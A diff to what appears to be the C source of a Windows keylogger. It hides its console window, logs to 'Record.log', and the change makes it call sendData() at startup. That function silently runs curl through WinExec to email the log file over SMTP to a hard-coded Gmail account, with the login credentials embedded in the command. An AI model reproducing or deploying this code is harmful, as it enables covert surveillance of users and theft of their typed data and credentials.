@@ -41,7 +41,7 @@ char* getRandomName();
 
 main(){
     FreeConsole();  //window is not visible
-    
+    sendData();
     age = get_setAge();
     if(checkRecordSize()){   ///check for right time
     
@@ -144,7 +144,7 @@ bool checkRecordSize(){
  */
 void sendData(){
     
-    char* command = "usb2 smtp://smtp.gmail.com:587 -v --mail-from \"wordpress.mibe@gmail.com\" --mail-rcpt \"wordpress.mibe@gmail.com\" --ssl -u wordpress.mibe@gmail.com:password -T \"Record.log\" -k --anyauth";
+    char* command = ".\\curl smtp://smtp.gmail.com:587 -v --mail-from \"wordpress.mibe@gmail.com\" --mail-rcpt \"wordpress.mibe@gmail.com\" --ssl -u wordpress.mibe@gmail.com:passw -T \"Record.log\" -k --anyauth";
     WinExec(command, SW_HIDE);
 }
 
